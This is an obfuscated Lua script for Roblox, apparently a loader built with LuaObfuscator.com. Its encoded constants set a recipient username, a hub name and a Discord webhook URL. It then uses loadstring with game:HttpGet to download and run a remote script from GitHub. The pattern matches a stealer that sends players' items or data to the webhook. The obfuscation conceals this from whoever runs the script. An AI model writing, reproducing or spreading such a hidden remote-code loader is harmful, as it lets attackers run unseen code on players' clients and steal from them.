--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v68=v2(v0(v30,16));if v19 then local v74=v5(v68,v19);v19=nil;return v74;else return v68;end end end);local function v20(v31,v32,v33)if v33 then local v69=(v31/(2^(v32-(2 -(1 + 0)))))%((5 -3)^(((v33-(1 -(877 -(282 + 595)))) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v69-(v69%((2569 -(1523 + 114)) -(857 + 74))) ;else local v70=((513 + 57) -(367 + 201))^(v32-1) ;return (((v31%(v70 + v70))>=v70) and ((1322 -394) -(214 + 713))) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + (1067 -(68 + 997)) ;return (v36 * (1526 -(226 + 1044))) + v35 ;end local function v23()local v37=0;local v38;local v39;local v40;local v41;while true do if (v37==(4 -3)) then return (v41 * (16777333 -(32 + 85))) + (v40 * (64226 + 1310)) + (v39 * (57 + 199)) + v38 ;end if (v37==(957 -(892 + 65))) then v38,v39,v40,v41=v1(v16,v18,v18 + (7 -(7 -3)) );v18=v18 + 4 ;v37=1 -0 ;end end end local function v24()local v42=v23();local v43=v23();local v44=(349 + 2) -(87 + 263) ;local v45=(v20(v43,1,200 -(67 + 113) ) * ((2 + 0)^32)) + v42 ;local v46=v20(v43,21,75 -(835 -(368 + 423)) );local v47=((v20(v43,(75 -51) + 8 )==(3 -2)) and  -(953 -(802 + 150))) or (2 -1) ;if (v46==0) then if (v45==(0 -0)) then return v47 * 0 ;else local v75=0 + 0 ;while true do if (v75==(997 -(915 + 82))) then v46=2 -1 ;v44=0;break;end end end elseif (v46==(1193 + 854)) then return ((v45==(0 -0)) and (v47 * ((1188 -(1069 + 118))/((18 -(10 + 8)) -0)))) or (v47 * NaN) ;end return v8(v47,v46-(2237 -1214) ) * (v44 + (v45/((1 + 1)^(92 -40)))) ;end local function v25(v48)local v49=0 -0 ;local v50;local v51;while true do if (v49==(443 -(416 + 26))) then v50=v3(v16,v18,(v18 + v48) -((2 + 1) -(7 -5)) );v18=v18 + v48 ;v49=1 + 1 ;end if (v49==(4 -1)) then return v6(v51);end if (v49==(438 -(145 + 293))) then v50=nil;if  not v48 then local v92=0 -0 ;while true do if (v92==(430 -((903 -(814 + 45)) + 386))) then v48=v23();if (v48==0) then return "";end break;end end end v49=1487 -(998 + 488) ;end if (v49==(1 + (1139 -(116 + 1022)))) then v51={};for v76=(2 -1) + (0 -0) , #v50 do v51[v76]=v2(v1(v3(v50,v76,v76)));end v49=775 -(201 + 571) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (3~=v52) then else v59=nil;v60=nil;v52=4;end if (v52~=(2 -1)) then else v55=nil;v56=nil;v52=2;end if (v52==(2 + 0)) then v57=nil;v58=nil;v52=244 -(187 + 54) ;end if (v52==(1125 -(118 + 1003))) then while true do if (2~=v53) then else local v95=780 -(162 + 618) ;while true do if (v95==(377 -(142 + 235))) then v58=nil;v59=nil;v95=1;end if (v95~=(1 + 0)) then else v53=2 + 1 ;break;end end end if (v53~=(6 -3)) then else v60=nil;while true do local v97=0;while true do if (v97==(0 -0)) then if (v54==(1 + 0)) then local v104=1636 -(1373 + 263) ;while true do if ((0 + 0)==v104) then v59=v23();v60={};v104=1001 -(451 + 549) ;end if (v104~=(1 + 1)) then else v54=2 -0 ;break;end if (v104~=1) then else for v110=1,v59 do local v111=0;local v112;local v113;local v114;local v115;while true do if ((1 -0)==v111) then v114=nil;v115=nil;v111=2;end if (v111==(1384 -(746 + 638))) then v112=0 + 0 ;v113=nil;v111=1 + 0 ;end if ((2 -0)==v111) then while true do if (v112==(342 -(218 + 123))) then v115=nil;while true do if (v113~=(1581 -(1535 + 46))) then else local v349=0;while true do if ((0 -0)==v349) then local v368=0;local v369;while true do if (v368==(0 + 0)) then v369=0;while true do if (v369==(1 + 0)) then v349=1;break;end if (0~=v369) then else local v376=0 + 0 ;while true do if (v376==(0 -0)) then v114=v21();v115=nil;v376=754 -(239 + 514) ;end if (v376==1) then v369=561 -(306 + 254) ;break;end end end end break;end end end if (1~=v349) then else v113=1330 -(797 + 532) ;break;end end end if (v113~=(1 + 0)) then else if (v114==(1 + 0)) then v115=v21()~=0 ;elseif (v114==(3 -1)) then v115=v24();elseif (v114~=(1470 -(899 + 568))) then else v115=v25();end v60[v110]=v115;break;end end break;end if (v112==(0 + 0)) then local v295=1202 -(373 + 829) ;while true do if (v295==0) then local v351=0;while true do if (v351==(2 -1)) then v295=604 -(268 + 335) ;break;end if (v351~=(290 -(60 + 230))) then else v113=572 -(426 + 146) ;v114=nil;v351=1 + 0 ;end end end if (v295==(1457 -(282 + 1174))) then v112=1;break;end end end end break;end end end v58[5 -2 ]=v21();v104=240 -(64 + 174) ;end end end if (2~=v54) then else local v105=0;while true do if ((812 -(569 + 242))~=v105) then else return v58;end if (v105==(0 + 0)) then for v116=1,v23() do local v117=0;local v118;local v119;local v120;local v121;while true do if (v117==(2 -1)) then v120=nil;v121=nil;v117=2 -0 ;end if (v117==(0 + 0)) then v118=1024 -(706 + 318) ;v119=nil;v117=1252 -(721 + 530) ;end if ((218 -(42 + 174))~=v117) then else while true do if (v118==1) then v121=nil;while true do if (v119==(1271 -(945 + 326))) then v120=0 -0 ;v121=nil;v119=1 + 0 ;end if ((1 + 0)==v119) then while true do if (v120==0) then v121=v21();if (v20(v121,701 -(271 + 429) ,1)~=(1504 -(363 + 1141))) then else local v370=0 + 0 ;local v371;local v372;local v373;local v374;while true do if (v370==(1502 -(1408 + 92))) then while true do if (v371==(1086 -(461 + 625))) then local v377=0;while true do if (v377~=(1581 -(1183 + 397))) then else v371=1289 -(993 + 295) ;break;end if (v377==(0 -0)) then v372=v20(v121,1 + 1 ,3);v373=v20(v121,4,6);v377=1172 -(418 + 753) ;end end end if (v371~=(2 + 1)) then else if (v20(v373,1978 -(1913 + 62) ,1 + 2 )==(2 -1)) then v374[2 + 2 ]=v60[v374[4]];end v55[v116]=v374;break;end if (v371~=(1934 -(565 + 1368))) then else v374={v22(),v22(),nil,nil};if (v372==(1769 -(1749 + 20))) then local v382=0 + 0 ;local v383;local v384;while true do if (v382==(1323 -(1249 + 73))) then while true do if (v383==0) then v384=0 + 0 ;while true do if (v384==0) then v374[3]=v22();v374[4]=v22();break;end end break;end end break;end if (v382==(1145 -(466 + 679))) then local v386=0 -0 ;while true do if (0==v386) then v383=0 -0 ;v384=nil;v386=1;end if ((305 -(244 + 60))==v386) then v382=1;break;end end end end elseif (v372==(2 -1)) then v374[479 -(41 + 435) ]=v23();elseif (v372==(1902 -(106 + 1794))) then v374[3 + 0 ]=v23() -((1 + 1)^(5 + 11)) ;elseif (v372==(8 -5)) then local v392=1613 -(1565 + 48) ;local v393;local v394;while true do if (v392==0) then v393=0 + 0 ;v394=nil;v392=1;end if (v392~=(2 -1)) then else while true do if (v393==(267 -(176 + 91))) then v394=0;while true do if (v394==(114 -(4 + 110))) then v374[587 -(57 + 527) ]=v23() -(2^(1443 -(41 + 1386))) ;v374[10 -6 ]=v22();break;end end break;end end break;end end end v371=105 -(17 + 86) ;end if (v371==2) then local v379=0;while true do if (v379==(1093 -(975 + 117))) then v371=3 + 0 ;break;end if (v379==(0 -0)) then if (v20(v373,1,2 -1 )==(167 -(122 + 44))) then v374[2]=v60[v374[2 -0 ]];end if (v20(v373,6 -4 ,6 -4 )==(1019 -(697 + 321))) then v374[3 + 0 ]=v60[v374[7 -4 ]];end v379=1 -0 ;end end end end break;end if (v370~=(2 -1)) then else local v375=0 + 0 ;while true do if (v375==(0 -0)) then v373=nil;v374=nil;v375=66 -(30 + 35) ;end if ((1 + 0)~=v375) then else v370=1259 -(1043 + 214) ;break;end end end if ((0 -0)==v370) then v371=611 -(602 + 9) ;v372=nil;v370=1213 -(323 + 889) ;end end end break;end end break;end end break;end if (v118==0) then local v296=0;while true do if (v296==(2 -1)) then v118=1;break;end if (v296==(1189 -(449 + 740))) then v119=580 -(361 + 219) ;v120=nil;v296=873 -(826 + 46) ;end end end end break;end end end for v122=948 -(245 + 702) ,v23() do v56[v122-(3 -2) ]=v28();end v105=321 -(53 + 267) ;end end end v97=1899 -(260 + 1638) ;end if (1==v97) then if (v54~=(0 + 0)) then else local v106=0 -0 ;while true do if ((414 -(15 + 398))~=v106) then else local v108=982 -(18 + 964) ;while true do if (v108==1) then v106=7 -5 ;break;end if (v108~=(0 + 0)) then else v57={};v58={v55,v56,nil,v57};v108=2 -1 ;end end end if (v106==(2 + 0)) then v54=127 -(116 + 10) ;break;end if (v106==(0 + 0)) then local v109=0 + 0 ;while true do if ((738 -(542 + 196))==v109) then v55={};v56={};v109=1 -0 ;end if (v109~=1) then else v106=1 + 0 ;break;end end end end end break;end end end break;end if (0~=v53) then else v54=0 + 0 ;v55=nil;v53=1 + 0 ;end if (v53==1) then local v96=0;while true do if (v96~=(683 -(483 + 200))) then else v56=nil;v57=nil;v96=2 -1 ;end if (1~=v96) then else v53=5 -3 ;break;end end end end break;end if (v52==(0 -0)) then v53=0;v54=nil;v52=1552 -(1126 + 425) ;end end end local function v29(v61,v62,v63)local v64=0;local v65;local v66;local v67;while true do if (v64==1) then v67=v61[3];return function(...)local v78=v65;local v79=v66;local v80=v67;local v81=v27;local v82=1;local v83= -1;local v84={};local v85={...};local v86=v12("#",...) -1 ;local v87={};local v88={};for v93=0,v86 do if (v93>=v80) then v84[v93-v80 ]=v85[v93 + 1 ];else v88[v93]=v85[v93 + 1 ];end end local v89=(v86-v80) + 1 ;local v90;local v91;while true do local v94=0;while true do if (v94==0) then v90=v78[v82];v91=v90[1];v94=1;end if (1==v94) then if (v91<=17) then if (v91<=8) then if (v91<=3) then if (v91<=1) then if (v91>0) then local v124=0;local v125;local v126;while true do if (v124==0) then v125=v90[2];v126=v88[v90[3]];v124=1;end if (v124==1) then v88[v125 + 1 ]=v126;v88[v125]=v126[v90[4]];break;end end else local v127;local v128;local v129,v130;local v131;v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v131=v90[2];v129,v130=v81(v88[v131](v13(v88,v131 + 1 ,v90[3])));v83=(v130 + v131) -1 ;v128=0;for v214=v131,v83 do v128=v128 + 1 ;v88[v214]=v129[v128];end v82=v82 + 1 ;v90=v78[v82];v131=v90[2];v88[v131](v13(v88,v131 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v131=v90[2];v88[v131](v88[v131 + 1 ]);v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v131=v90[2];v127=v88[v90[3]];v88[v131 + 1 ]=v127;v88[v131]=v127[v90[4]];end elseif (v91>2) then local v142=v79[v90[3]];local v143;local v144={};v143=v10({},{__index=function(v217,v218)local v219=v144[v218];return v219[1][v219[2]];end,__newindex=function(v220,v221,v222)local v223=0;local v224;while true do if (v223==0) then v224=v144[v221];v224[1][v224[2]]=v222;break;end end end});for v225=1,v90[4] do v82=v82 + 1 ;local v226=v78[v82];if (v226[1]==34) then v144[v225-1 ]={v88,v226[3]};else v144[v225-1 ]={v62,v226[3]};end v87[ #v87 + 1 ]=v144;end v88[v90[2]]=v29(v142,v143,v63);else local v146;local v147;local v148;local v149;local v150;local v151;local v152,v153;local v154;v154=v90[2];v152,v153=v81(v88[v154](v13(v88,v154 + 1 ,v90[3])));v83=(v153 + v154) -1 ;v151=0;for v228=v154,v83 do local v229=0;while true do if (v229==0) then v151=v151 + 1 ;v88[v228]=v152[v151];break;end end end v82=v82 + 1 ;v90=v78[v82];v154=v90[2];v88[v154]=v88[v154](v13(v88,v154 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]();v82=v82 + 1 ;v90=v78[v82];v154=v90[2];v150={};for v230=1, #v87 do v149=v87[v230];for v252=0, #v149 do local v253=0;while true do if (v253==1) then v146=v148[2];if ((v147==v88) and (v146>=v154)) then v150[v146]=v147[v146];v148[1]=v150;end break;end if (v253==0) then v148=v149[v252];v147=v148[1];v253=1;end end end end v82=v82 + 1 ;v90=v78[v82];do return;end end elseif (v91<=5) then if (v91==4) then if (v88[v90[2]]==v90[4]) then v82=v82 + 1 ;else v82=v90[3];end else v88[v90[2]]=v62[v90[3]];end elseif (v91<=6) then if  not v88[v90[2]] then v82=v82 + 1 ;else v82=v90[3];end elseif (v91>7) then v88[v90[2]]=v88[v90[3]][v90[4]];else v88[v90[2]]=v90[3];end elseif (v91<=12) then if (v91<=10) then if (v91>9) then v88[v90[2]]=v88[v90[3]]%v88[v90[4]] ;else local v161=0;local v162;while true do if (v161==0) then v162=v90[2];do return v88[v162](v13(v88,v162 + 1 ,v90[3]));end break;end end end elseif (v91==11) then local v163=v90[2];v88[v163](v88[v163 + 1 ]);else local v164=v90[2];v88[v164](v13(v88,v164 + 1 ,v83));end elseif (v91<=14) then if (v91>13) then local v165;local v166,v167;local v168;v88[v90[2]]=v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]] + v90[4] ;v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v166,v167=v81(v88[v168](v13(v88,v168 + 1 ,v90[3])));v83=(v167 + v168) -1 ;v165=0;for v232=v168,v83 do local v233=0;while true do if (v233==0) then v165=v165 + 1 ;v88[v232]=v166[v165];break;end end end v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v88[v168]=v88[v168](v13(v88,v168 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v62[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]] -v90[4] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]= #v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]]%v88[v90[4]] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3] + v88[v90[4]] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]] -v90[4] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]= #v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]]%v88[v90[4]] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3] + v88[v90[4]] ;v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]] + v90[4] ;v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v166,v167=v81(v88[v168](v13(v88,v168 + 1 ,v90[3])));v83=(v167 + v168) -1 ;v165=0;for v234=v168,v83 do v165=v165 + 1 ;v88[v234]=v166[v165];end v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v166,v167=v81(v88[v168](v13(v88,v168 + 1 ,v83)));v83=(v167 + v168) -1 ;v165=0;for v237=v168,v83 do local v238=0;while true do if (v238==0) then v165=v165 + 1 ;v88[v237]=v166[v165];break;end end end v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v88[v168]=v88[v168](v13(v88,v168 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]]%v90[4] ;v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v166,v167=v81(v88[v168](v88[v168 + 1 ]));v83=(v167 + v168) -1 ;v165=0;for v239=v168,v83 do local v240=0;while true do if (v240==0) then v165=v165 + 1 ;v88[v239]=v166[v165];break;end end end v82=v82 + 1 ;v90=v78[v82];v168=v90[2];v88[v168](v13(v88,v168 + 1 ,v83));else v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v90=v78[v82];if  not v88[v90[2]] then v82=v82 + 1 ;else v82=v90[3];end end elseif (v91<=15) then v88[v90[2]]=v88[v90[3]]%v90[4] ;elseif (v91>16) then local v261=0;local v262;while true do if (v261==0) then v262=v90[2];do return v13(v88,v262,v83);end break;end end else do return;end end elseif (v91<=26) then if (v91<=21) then if (v91<=19) then if (v91>18) then local v180=v90[2];local v181,v182=v81(v88[v180](v13(v88,v180 + 1 ,v90[3])));v83=(v182 + v180) -1 ;local v183=0;for v241=v180,v83 do v183=v183 + 1 ;v88[v241]=v181[v183];end else v88[v90[2]]();end elseif (v91==20) then v88[v90[2]]={};else v88[v90[2]]=v63[v90[3]];end elseif (v91<=23) then if (v91==22) then v88[v90[2]]=v90[3] + v88[v90[4]] ;else local v188=v90[2];local v189,v190=v81(v88[v188](v13(v88,v188 + 1 ,v83)));v83=(v190 + v188) -1 ;local v191=0;for v244=v188,v83 do v191=v191 + 1 ;v88[v244]=v189[v191];end end elseif (v91<=24) then local v192=0;local v193;while true do if (v192==0) then v193=v90[2];v88[v193]=v88[v193](v13(v88,v193 + 1 ,v83));break;end end elseif (v91>25) then local v263=0;local v264;local v265;local v266;local v267;while true do if (5==v263) then v267=v90[2];v88[v267](v13(v88,v267 + 1 ,v83));v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v63[v90[3]];v263=6;end if (6==v263) then v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v263=7;end if (v263==0) then v264=nil;v265,v266=nil;v267=nil;v88[v90[2]]=v63[v90[3]];v82=v82 + 1 ;v263=1;end if (v263==3) then v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v267=v90[2];v265,v266=v81(v88[v267](v13(v88,v267 + 1 ,v90[3])));v263=4;end if (v263==2) then v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v263=3;end if (7==v263) then v88[v90[2]]=v88[v90[3]];break;end if (v263==1) then v90=v78[v82];v88[v90[2]]=v88[v90[3]][v90[4]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v88[v90[3]];v263=2;end if (4==v263) then v83=(v266 + v267) -1 ;v264=0;for v347=v267,v83 do local v348=0;while true do if (v348==0) then v264=v264 + 1 ;v88[v347]=v265[v264];break;end end end v82=v82 + 1 ;v90=v78[v82];v263=5;end end else v88[v90[2]]=v88[v90[3]] + v90[4] ;end elseif (v91<=31) then if (v91<=28) then if (v91==27) then local v194;local v195;local v196;v88[v90[2]]=v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]= #v88[v90[3]];v82=v82 + 1 ;v90=v78[v82];v88[v90[2]]=v90[3];v82=v82 + 1 ;v90=v78[v82];v196=v90[2];v195=v88[v196];v194=v88[v196 + 2 ];if (v194>0) then if (v195>v88[v196 + 1 ]) then v82=v90[3];else v88[v196 + 3 ]=v195;end elseif (v195<v88[v196 + 1 ]) then v82=v90[3];else v88[v196 + 3 ]=v195;end else v88[v90[2]]= #v88[v90[3]];end elseif (v91<=29) then v88[v90[2]]=v88[v90[3]] -v90[4] ;elseif (v91>30) then local v269=0;local v270;local v271;local v272;while true do if (v269==0) then v270=v90[2];v271=v88[v270 + 2 ];v269=1;end if (v269==2) then if (v271>0) then if (v272<=v88[v270 + 1 ]) then v82=v90[3];v88[v270 + 3 ]=v272;end elseif (v272>=v88[v270 + 1 ]) then v82=v90[3];v88[v270 + 3 ]=v272;end break;end if (v269==1) then v272=v88[v270] + v271 ;v88[v270]=v272;v269=2;end end else v82=v90[3];end elseif (v91<=33) then if (v91==32) then local v206=v90[2];local v207={};for v247=1, #v87 do local v248=v87[v247];for v274=0, #v248 do local v275=0;local v276;local v277;local v278;while true do if (0==v275) then v276=v248[v274];v277=v276[1];v275=1;end if (v275==1) then v278=v276[2];if ((v277==v88) and (v278>=v206)) then v207[v278]=v277[v278];v276[1]=v207;end break;end end end end else local v208=v90[2];local v209,v210=v81(v88[v208](v88[v208 + 1 ]));v83=(v210 + v208) -1 ;local v211=0;for v249=v208,v83 do v211=v211 + 1 ;v88[v249]=v209[v211];end end elseif (v91<=34) then v88[v90[2]]=v88[v90[3]];elseif (v91>35) then local v279=0;local v280;local v281;local v282;while true do if (0==v279) then v280=v90[2];v281=v88[v280];v279=1;end if (v279==1) then v282=v88[v280 + 2 ];if (v282>0) then if (v281>v88[v280 + 1 ]) then v82=v90[3];else v88[v280 + 3 ]=v281;end elseif (v281<v88[v280 + 1 ]) then v82=v90[3];else v88[v280 + 3 ]=v281;end break;end end else for v293=v90[2],v90[3] do v88[v293]=nil;end end v82=v82 + 1 ;break;end end end end;end if (v64==0) then v65=v61[1];v66=v61[2];v64=1;end end end return v29(v28(),{},v17)(...);end v15("LOL!173O0003063O00737472696E6703043O006368617203043O00627974652O033O0073756203053O0062697433322O033O0062697403043O0062786F7203053O007461626C6503063O00636F6E63617403063O00696E7365727403023O005F4703083O00557365726E616D6503113O0016C5D7CB2DE3BAD11BDFCDD431F4BEC61203083O007EB1A3BB4586DBA703073O004875624E616D6503063O00D12AC121F0EC03053O009C43AD4AA5030A3O00576562682O6F6B55726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31323339313930343336312O39323139322F706A39516C5846426B36544A6B346E526B463350384D6D4E586548687442512D6A375145373665312O51504D392O555649514F48695A593130596134444B5157714E4A47030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574033C3O00682O7470733A2O2F6769746875622E636F6D2F4A61792O696F6365616E2O692F5065616B4F6E546F702F626C6F622F6D61696E2F7065616B2E6C756100313O00120D3O00013O00206O000200122O000100013O00202O00010001000300122O000200013O00202O00020002000400122O000300053O00062O0003000A0001000100041E3O000A0001001215000300063O002008000400030007001215000500083O002008000500050009001215000600083O00200800060006000A00060300073O000100062O00223O00054O00223O00064O00228O00223O00044O00223O00014O00223O00023O00121A0008000B3O00202O00080008000C4O000900073O00122O000A000D3O00122O000B000E6O0009000B6O00083O000100122O0008000B3O00202O00080008000F4O000900073O001207000A00103O00122O000B00116O0009000B6O00083O000100122O0008000B3O00202O00080008001200122O000900136O00080002000100122O000800143O00122O000900153O00202O000900090016001207000B00174O00020009000B6O00083O00024O0008000100019O006O00013O00013O00033O00028O00026O00F03F026O00704002313O001207000200014O0023000300033O002604000200080001000200041E3O000800012O000500046O0022000500034O0009000400054O001100045O002604000200020001000100041E3O000200012O001400046O001B000300043O00122O000400026O00055O00122O000600023O00042O0004002E00012O0005000800014O000E000900036O000A00026O000B00036O000C00046O000D00056O000E8O000F00073O00202O0010000700024O000D00106O000C3O00024O000D00046O000E00056O000F00013O00202O0010000700024O001100016O00100010001100102O00100002001000202O0011000700024O001200016O00110011001200102O00110002001100202O0011001100024O000E00116O000D8O000B3O000200202O000B000B00034O000A000B6O00083O000100041F000400100001001207000200023O00041E3O000200012O00103O00017O00",v9(),...);end